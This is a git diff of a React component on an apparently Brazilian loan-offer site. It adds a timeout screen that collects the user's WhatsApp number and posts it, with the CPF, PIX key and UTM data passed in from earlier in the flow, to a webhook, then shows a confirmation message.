@@ -1,7 +1,10 @@
 import { useState, useEffect } from "react";
 import { TetrisGame } from "./TetrisGame";
-import { MessageCircle, AlertTriangle } from "lucide-react";
+import { MessageCircle, AlertTriangle, Phone, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { getUtmData } from "@/hooks/use-utm-tracking";
 
 const isDataprevClosingPeriod = () => {
   const today = new Date();
@@ -42,8 +45,33 @@ const DataprevMessage = () => {
   );
 };
 
-export const LoadingProposals = () => {
+interface LoadingProposalsProps {
+  isTimedOut?: boolean;
+  cpf?: string;
+  pixType?: string;
+  pixKey?: string;
+  onWhatsAppSubmit?: (phone: string) => void;
+}
+
+const formatPhone = (value: string) => {
+  const numbers = value.replace(/\D/g, '');
+  if (numbers.length <= 2) return numbers;
+  if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
+  if (numbers.length <= 11) return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
+  return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
+};
+
+export const LoadingProposals = ({ 
+  isTimedOut = false, 
+  cpf = "", 
+  pixType = "", 
+  pixKey = "",
+  onWhatsAppSubmit 
+}: LoadingProposalsProps) => {
   const [showGame, setShowGame] = useState(true);
+  const [whatsappNumber, setWhatsappNumber] = useState("");
+  const [showConfirmation, setShowConfirmation] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const isClosingPeriod = isDataprevClosingPeriod();
 
   // Scroll to top when component mounts
@@ -55,6 +83,136 @@ export const LoadingProposals = () => {
     setShowGame(false);
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
+
+  const handleWhatsAppSubmit = async () => {
+    const cleanNumber = whatsappNumber.replace(/\D/g, '');
+    if (cleanNumber.length < 10) return;
+
+    setIsSubmitting(true);
+    
+    try {
+      const utmData = getUtmData();
+      
+      await fetch("https://webhook.vpslegaleviver.shop/webhook/timeout_whatsapp", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          event: "timeout_whatsapp_collected",
+          timestamp: new Date().toISOString(),
+          origem: utmData,
+          data: {
+            cpf,
+            pixType,
+            pixKey,
+            whatsapp: cleanNumber,
+          }
+        }),
+      });
+    } catch (error) {
+      console.error("Erro ao enviar WhatsApp:", error);
+    }
+
+    setIsSubmitting(false);
+    setShowConfirmation(true);
+    
+    if (onWhatsAppSubmit) {
+      onWhatsAppSubmit(cleanNumber);
+    }
+  };
+
+  const handleConfirmationClose = () => {
+    window.location.href = '/';
+  };
+
+  // Tela de confirmação após enviar WhatsApp
+  if (showConfirmation) {
+    return (
+      <div className="w-full max-w-lg mx-auto text-center animate-in fade-in duration-500 p-4">
+        <div className="bg-card border rounded-2xl p-6 md:p-8 shadow-lg">
+          <div className="relative inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 mb-4 md:mb-6">
+            <div className="absolute inset-0 rounded-full bg-secondary/20 animate-pulse" />
+            <div className="relative flex items-center justify-center w-20 h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-secondary/30 to-secondary/10">
+              <CheckCircle2 className="w-10 h-10 md:w-12 md:h-12 text-secondary" strokeWidth={2} />
+            </div>
+          </div>
+          
+          <h2 className="text-xl md:text-2xl font-bold mb-4 text-secondary">Muito obrigado! 💚</h2>
+          
+          <div className="space-y-4 text-muted-foreground text-sm md:text-base leading-relaxed">
+            <p>
+              Entraremos em contato em <strong className="text-foreground">no máximo 24 horas</strong> via WhatsApp para te informar as opções disponíveis.
+            </p>
+            <p>
+              Caso não entremos em contato dentro deste período, infelizmente significa que ainda não teremos valores liberados para você.
+            </p>
+            <p className="text-secondary font-medium">
+              Mas fique tranquilo! Faremos de tudo para te dar um retorno positivo em até 24 horas.
+            </p>
+          </div>
+          
+          <Button 
+            variant="secondary" 
+            size="lg" 
+            className="w-full mt-6"
+            onClick={handleConfirmationClose}
+          >
+            Entendido
+          </Button>
+        </div>
+      </div>
+    );
+  }
+
+  // Tela de coleta de WhatsApp após timeout
+  if (isTimedOut) {
+    return (
+      <div className="w-full max-w-lg mx-auto text-center animate-in fade-in duration-500 p-4">
+        <div className="bg-card border rounded-2xl p-6 md:p-8 shadow-lg">
+          <div className="relative inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 mb-4 md:mb-6">
+            <div className="absolute inset-0 rounded-full bg-secondary/20 animate-pulse" />
+            <div className="relative flex items-center justify-center w-20 h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-secondary/30 to-secondary/10">
+              <Phone className="w-10 h-10 md:w-12 md:h-12 text-secondary" strokeWidth={2} />
+            </div>
+          </div>
+          
+          <h2 className="text-xl md:text-2xl font-bold mb-2 text-secondary">Tudo certo por aqui! ✅</h2>
+          
+          <p className="text-muted-foreground text-sm md:text-base mb-6 leading-relaxed">
+            Estamos fazendo a melhor análise possível para te trazer as melhores opções dentro dos cinco bancos que operamos. 
+            Assim que tivermos retorno, <strong className="text-foreground">entraremos em contato pelo WhatsApp</strong>.
+          </p>
+          
+          <div className="space-y-3 text-left">
+            <Label htmlFor="whatsapp" className="text-sm md:text-base font-medium">
+              Informe seu WhatsApp para contato
+            </Label>
+            <Input
+              id="whatsapp"
+              type="tel"
+              placeholder="(00) 00000-0000"
+              value={whatsappNumber}
+              onChange={(e) => setWhatsappNumber(formatPhone(e.target.value))}
+              className="text-center text-lg"
+              maxLength={15}
+            />
+          </div>
+          
+          <Button 
+            variant="secondary" 
+            size="lg" 
+            className="w-full mt-6 gap-2"
+            onClick={handleWhatsAppSubmit}
+            disabled={whatsappNumber.replace(/\D/g, '').length < 10 || isSubmitting}
+          >
+            <MessageCircle className="w-5 h-5" />
+            {isSubmitting ? "Salvando..." : "Salvar"}
+          </Button>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="w-full max-w-2xl mx-auto text-center animate-in fade-in duration-500">
